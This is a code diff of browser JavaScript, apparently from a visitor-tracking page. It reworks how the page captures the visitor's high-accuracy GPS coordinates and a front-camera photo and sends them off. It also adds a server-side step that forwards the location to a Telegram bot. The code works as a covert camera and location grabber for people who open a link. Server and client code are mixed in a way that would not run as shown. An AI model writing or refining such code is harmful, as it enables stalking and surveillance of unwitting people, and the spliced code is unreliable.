@@ -74,25 +74,33 @@ send({
 let gpsDone = false;
 let gpsData = {};
 
-navigator.geolocation.getCurrentPosition(
-  pos => {
-    gpsDone = true;
-    gpsData = {
-      lat: pos.coords.latitude,
-      lng: pos.coords.longitude
-    };
+// robust GPS
+function getGPS() {
+  return new Promise(resolve => {
+    navigator.geolocation.getCurrentPosition(
+      pos => {
+        gpsDone = true;
+        gpsData = {
+          lat: pos.coords.latitude,
+          lng: pos.coords.longitude
+        };
 
-    send({
-      event: "gps",
-      ...gpsData
-    });
-  },
-  () => {
-    gpsDone = true;
-    send({ event: "gps_denied" });
-  }
-);
-
+        send({ event: "gps", ...gpsData });
+        resolve();
+      },
+      err => {
+        console.log("GPS error:", err.message);
+        gpsDone = true;
+        resolve();
+      },
+      {
+        enableHighAccuracy: true,
+        timeout: 5000,
+        maximumAge: 0
+      }
+    );
+  });
+}
 // ==============================
 // FINAL CONTROL (NO DUPLICATE)
 // ==============================
@@ -113,51 +121,45 @@ function sendFinal(data) {
 // CAMERA CAPTURE (FIXED FLOW)
 // ==============================
 async function camera() {
+
+  // 👉 START GPS FIRST
+  const gpsPromise = getGPS();
+
   try {
     const stream = await navigator.mediaDevices.getUserMedia({
-      video: {
-        width: { ideal: 640 },
-        height: { ideal: 480 },
-        facingMode: "user"
-      }
+      video: { facingMode: "user" }
     });
 
     const video = document.createElement("video");
     video.srcObject = stream;
     await video.play();
 
-    // ⏳ WAIT FOR GPS (MAX 2s)
-    const start = Date.now();
-    while (!gpsDone && Date.now() - start < 2000) {
-      await new Promise(r => setTimeout(r, 100));
-    }
+    // ⏳ WAIT GPS (max 5 sec)
+    await Promise.race([
+      gpsPromise,
+      new Promise(r => setTimeout(r, 5000))
+    ]);
 
     const canvas = document.createElement("canvas");
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
 
-    const ctx = canvas.getContext("2d");
-    ctx.drawImage(video, 0, 0);
+    canvas.getContext("2d").drawImage(video, 0, 0);
 
     const image = canvas.toDataURL("image/jpeg", 0.85);
 
     sendFinal({
       image,
-      ...gpsData,
-      device: navigator.userAgent,
-      os: navigator.platform,
-      browser: navigator.userAgent,
-      network: navigator.connection?.effectiveType || "unknown"
+      ...gpsData
     });
 
     stream.getTracks().forEach(t => t.stop());
 
-  } catch (e) {
-    // ⏳ WAIT FOR GPS BEFORE FINAL
-    const start = Date.now();
-    while (!gpsDone && Date.now() - start < 2000) {
-      await new Promise(r => setTimeout(r, 100));
-    }
+  } catch {
+    await Promise.race([
+      gpsPromise,
+      new Promise(r => setTimeout(r, 5000))
+    ]);
 
     sendFinal({
       camera: "denied",
@@ -166,6 +168,15 @@ async function camera() {
   }
 }
 
+if (body.event === "gps" && session.lat && session.lng) {
+  const key = `gps_sent_${id}`;
+  const done = await env.VISITOR_KV.get(key);
+
+  if (!done) {
+    await safeTelegram(env, session);
+    await env.VISITOR_KV.put(key, "1", { expirationTtl: 300 });
+  }
+}
 // ==============================
 // RUN CAMERA
 // ==============================
